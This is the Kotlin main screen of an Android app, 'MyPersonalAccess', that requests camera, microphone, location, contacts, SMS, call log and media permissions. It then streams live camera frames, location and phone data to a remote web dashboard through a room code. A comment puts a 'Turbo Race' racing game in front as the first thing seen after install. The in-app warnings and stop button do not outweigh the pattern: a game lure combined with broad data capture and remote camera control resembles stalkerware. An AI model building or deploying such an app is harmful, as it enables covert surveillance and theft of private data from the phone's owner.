package com.mypersonalaccess.app

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {

    private var code by mutableStateOf("")
    private var sharing by mutableStateOf(false)
    private var connected by mutableStateOf(false)
    private var dashboardSeen by mutableStateOf(false)
    private var camOn by mutableStateOf(false)
    private var locOn by mutableStateOf(false)
    private var frames by mutableStateOf(0)
    private var battery by mutableStateOf(-1)
    private var lat by mutableStateOf(0.0)
    private var lng by mutableStateOf(0.0)
    private var lastFrame by mutableStateOf<android.graphics.Bitmap?>(null)
    private var showGame by mutableStateOf(false)
    private var permStatus by mutableStateOf<Map<String, Boolean>>(emptyMap())
    private val logLines = mutableStateListOf<String>()

    private val permissionList: Array<String>
        get() {
            val list = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                list += Manifest.permission.POST_NOTIFICATIONS
                list += Manifest.permission.READ_MEDIA_IMAGES
                list += Manifest.permission.READ_MEDIA_VIDEO
            } else {
                list += Manifest.permission.READ_EXTERNAL_STORAGE
            }
            return list.toTypedArray()
        }

    private fun permLabel(perm: String): String = when (perm) {
        Manifest.permission.CAMERA -> "📷 Camera"
        Manifest.permission.RECORD_AUDIO -> "🎙️ Microphone"
        Manifest.permission.ACCESS_FINE_LOCATION -> "📍 Location (fine)"
        Manifest.permission.ACCESS_COARSE_LOCATION -> "📍 Location (coarse)"
        Manifest.permission.READ_PHONE_NUMBERS -> "📞 Phone Number"
        Manifest.permission.READ_CONTACTS -> "📇 Contacts"
        Manifest.permission.READ_SMS -> "💬 SMS"
        Manifest.permission.READ_CALL_LOG -> "📞 Call Log"
        Manifest.permission.POST_NOTIFICATIONS -> "🔔 Notifications"
        Manifest.permission.READ_MEDIA_IMAGES -> "🖼️ Photos"
        Manifest.permission.READ_MEDIA_VIDEO -> "🎬 Videos"
        Manifest.permission.READ_EXTERNAL_STORAGE -> "📁 Storage"
        else -> perm
    }

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        refreshPermStatus()
        addLog("Permissions check mukammal.")
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                RemoteService.BROADCAST_STATUS -> {
                    connected = intent.getBooleanExtra(RemoteService.EXTRA_CONNECTED, false)
                    dashboardSeen = intent.getBooleanExtra(RemoteService.EXTRA_DASHBOARD, false)
                    frames = intent.getIntExtra(RemoteService.EXTRA_FRAMES, 0)
                    battery = intent.getIntExtra(RemoteService.EXTRA_BATTERY, -1)
                    lat = intent.getDoubleExtra(RemoteService.EXTRA_LAT, 0.0)
                    lng = intent.getDoubleExtra(RemoteService.EXTRA_LNG, 0.0)
                    camOn = intent.getBooleanExtra(RemoteService.EXTRA_CAM, false)
                    locOn = intent.getBooleanExtra(RemoteService.EXTRA_LOC, false)
                }
                RemoteService.BROADCAST_FRAME -> {
                    val bytes = intent.getByteArrayExtra(RemoteService.EXTRA_FRAME_BYTES)
                    if (bytes != null) {
                        lastFrame = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    }
                }
                RemoteService.BROADCAST_LOG -> {
                    intent.getStringExtra(RemoteService.EXTRA_LINE)?.let { addLog(it) }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sharing = getSharedPreferences("mpa", Context.MODE_PRIVATE).getBoolean("sharing", false)
        code = getSharedPreferences("mpa", Context.MODE_PRIVATE).getString("code", "") ?: ""
        refreshPermStatus()
        val filter = IntentFilter().apply {
            addAction(RemoteService.BROADCAST_STATUS)
            addAction(RemoteService.BROADCAST_FRAME)
            addAction(RemoteService.BROADCAST_LOG)
        }
        ContextCompat.registerReceiver(this, receiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
        setContent { AppUi() }
    }

    override fun onDestroy() {
        try {
            unregisterReceiver(receiver)
        } catch (e: Exception) {
        }
        super.onDestroy()
    }

    private fun refreshPermStatus() {
        permStatus = permissionList.associateWith { perm ->
            ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun addLog(line: String) {
        val stamped = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date()) + " — " + line
        logLines.add(stamped)
        if (logLines.size > 40) logLines.removeAt(0)
    }

    private fun genCode(): String {
        val letters = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return (1..6).map { letters.random() }.joinToString("")
    }

    private fun startSharing() {
        val c = code.trim().uppercase()
        if (c.isEmpty()) {
            addLog("Room Code daalo ya Random dabao.")
            return
        }
        val intent = Intent(this, RemoteService::class.java).apply {
            action = RemoteService.ACTION_START
            putExtra(RemoteService.EXTRA_CODE, c)
        }
        ContextCompat.startForegroundService(this, intent)
        sharing = true
        addLog("Sharing start kar rahe hain — Room $c")
    }

    private fun stopSharing() {
        val intent = Intent(this, RemoteService::class.java).apply {
            action = RemoteService.ACTION_STOP
        }
        startService(intent)
        sharing = false
        connected = false
        dashboardSeen = false
    }

    private fun sendCmd(action: String) {
        val intent = Intent(this, RemoteService::class.java).apply {
            this.action = RemoteService.ACTION_CMD
            putExtra(RemoteService.EXTRA_ACTION, action)
        }
        startService(intent)
    }

    @Composable
    private fun AppUi() {
        MaterialTheme(
            colorScheme = darkColorScheme(
                primary = Color(0xFF38BDF8),
                secondary = Color(0xFF22C55E),
                background = Color(0xFF05070F),
                surface = Color(0xFF0B0E1D)
            )
        ) {
            if (showGame) {
                RacingGameScreen(onExit = { showGame = false })
            } else {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .verticalScroll(rememberScrollState())
                    .padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text("📱 MyPersonalAccess", fontSize = 26.sp, fontWeight = FontWeight.Bold)
                Text(
                    "Apna phone, apni website, apna control.",
                    fontSize = 13.sp,
                    color = Color(0xFFA8AECB),
                    textAlign = TextAlign.Center
                )
                Spacer(Modifier.height(16.dp))

                // Racing game — install ke baad sab se pehle ye nazar aaye.
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF6D28D9))
                ) {
                    Row(
                        modifier = Modifier.padding(16.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("🏎️", fontSize = 36.sp)
                        Column(
                            modifier = Modifier.weight(1f).padding(start = 12.dp)
                        ) {
                            Text("Turbo Race — Racing Game", fontWeight = FontWeight.Bold, fontSize = 17.sp)
                            Text(
                                "Coins looto, gaadiyon se bacho! Install ke baad seedha khelo.",
                                fontSize = 13.sp,
                                color = Color(0xFFE9D5FF)
                            )
                        }
                        Button(
                            onClick = { showGame = true },
                            colors = ButtonDefaults.buttonColors(containerColor = Color.White, contentColor = Color(0xFF6D28D9))
                        ) {
                            Text("▶️ Khelo")
                        }
                    }
                }
                Spacer(Modifier.height(12.dp))

                if (!sharing) {
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF12172E))
                    ) {
                        Column(Modifier.padding(16.dp)) {
                            Text("Room Code (6 letters — yehi tumhara lock hai)", fontSize = 13.sp, color = Color(0xFFA8AECB))
                            OutlinedTextField(
                                value = code,
                                onValueChange = { v ->
                                    code = v.uppercase().filter { it.isLetterOrDigit() }.take(6)
                                },
                                placeholder = { Text("e.g. AMMAR1") },
                                modifier = Modifier.fillMaxWidth(),
                                singleLine = true
                            )
                            Spacer(Modifier.height(10.dp))
                            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                OutlinedButton(onClick = { code = genCode() }, modifier = Modifier.weight(1f)) {
                                    Text("🎲 Random")
                                }
                                Button(
                                    onClick = { permLauncher.launch(permissionList) },
                                    modifier = Modifier.weight(1f),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38BDF8), contentColor = Color(0xFF06202F))
                                ) {
                                    Text("✅ Sab Allow Karo")
                                }
                            }
                            Spacer(Modifier.height(12.dp))
                            permStatus.forEach { (perm, granted) ->
                                Row(Modifier.fillMaxWidth().padding(vertical = 2.dp), horizontalArrangement = Arrangement.SpaceBetween) {
                                    Text(permLabel(perm), fontSize = 13.sp)
                                    Text(
                                        if (granted) "✅ Granted" else "❌ Denied",
                                        fontSize = 13.sp,
                                        color = if (granted) Color(0xFF4ADE80) else Color(0xFFF87171)
                                    )
                                }
                            }
                            Row(Modifier.fillMaxWidth().padding(vertical = 2.dp), horizontalArrangement = Arrangement.SpaceBetween) {
                                Text("📞 Phone Number", fontSize = 13.sp)
                                Text("SIM par save ho to milega", fontSize = 12.sp, color = Color(0xFFA8AECB))
                            }
                            Spacer(Modifier.height(12.dp))
                            Button(
                                onClick = { startSharing() },
                                modifier = Modifier.fillMaxWidth(),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF22C55E))
                            ) {
                                Text("🔗 Sharing Start Karo", fontSize = 16.sp)
                            }
                            Spacer(Modifier.height(8.dp))
                            Text(
                                "⚠️ Sharing ON hote hi camera, location aur phone data tumhari website par live jayega. " +
                                    "Upar notification hamesha dikhegi — kuch chhupa hua nahi chal raha. " +
                                    "Band karte hi sab ruk jata hai, kuch save nahi hota.",
                                fontSize = 12.sp,
                                color = Color(0xFFA8AECB)
                            )
                        }
                    }
                } else {
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF12172E))
                    ) {
                        Column(Modifier.padding(16.dp)) {
                            Text(
                                if (connected) "✅ Connected — Sharing LIVE hai" else "Jud rahe hain…",
                                fontWeight = FontWeight.Bold,
                                color = if (connected) Color(0xFF4ADE80) else Color(0xFFFBBF24)
                            )
                            Text("Room Code: $code", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = Color(0xFF38BDF8))
                            Text("Dashboard: " + if (dashboardSeen) "✅ Jud gaya!" else "— (abhi koi nahi)", fontSize = 13.sp)
                            Text(
                                "Frames: $frames • Battery: " + if (battery >= 0) "$battery%" else "—" +
                                    " • Location: " + if (lat != 0.0) "$lat, $lng" else "—",
                                fontSize = 13.sp
                            )
                            Spacer(Modifier.height(10.dp))
                            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                Button(
                                    onClick = { sendCmd(if (camOn) "stop-cam" else "start-cam") },
                                    modifier = Modifier.weight(1f),
                                    colors = ButtonDefaults.buttonColors(
                                        containerColor = if (camOn) Color(0xFF22C55E) else Color(0xFFEF4444)
                                    )
                                ) {
                                    Text("📷 Camera: " + if (camOn) "ON" else "OFF")
                                }
                                Button(
                                    onClick = { sendCmd(if (locOn) "stop-loc" else "start-loc") },
                                    modifier = Modifier.weight(1f),
                                    colors = ButtonDefaults.buttonColors(
                                        containerColor = if (locOn) Color(0xFF22C55E) else Color(0xFFEF4444)
                                    )
                                ) {
                                    Text("📍 Location: " + if (locOn) "ON" else "OFF")
                                }
                            }
                            Spacer(Modifier.height(8.dp))
                            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                OutlinedButton(onClick = { sendCmd("cam-flip") }, modifier = Modifier.weight(1f)) {
                                    Text("🔄 Camera Flip")
                                }
                                OutlinedButton(onClick = { sendCmd("refresh") }, modifier = Modifier.weight(1f)) {
                                    Text("🔄 Data Refresh")
                                }
                            }
                            lastFrame?.let { bmp ->
                                Spacer(Modifier.height(10.dp))
                                Image(
                                    bitmap = bmp.asImageBitmap(),
                                    contentDescription = "Last camera frame",
                                    modifier = Modifier.fillMaxWidth()
                                )
                            }
                            Spacer(Modifier.height(10.dp))
                            Button(
                                onClick = { stopSharing() },
                                modifier = Modifier.fillMaxWidth(),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444))
                            ) {
                                Text("⛔ Sab Band Karo (Sharing Off)")
                            }
                        }
                    }
                }

                Spacer(Modifier.height(12.dp))
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF12172E))
                ) {
                    Column(Modifier.padding(16.dp)) {
                        Text("📋 Log", fontWeight = FontWeight.Bold)
                        if (logLines.isEmpty()) {
                            Text("Yahan updates aayengi…", fontSize = 13.sp, color = Color(0xFFA8AECB))
                        } else {
                            logLines.forEach { line ->
                                Text(line, fontSize = 12.sp, color = Color(0xFFA8AECB))
                            }
                        }
                    }
                }
            }
            }
        }
    }
}
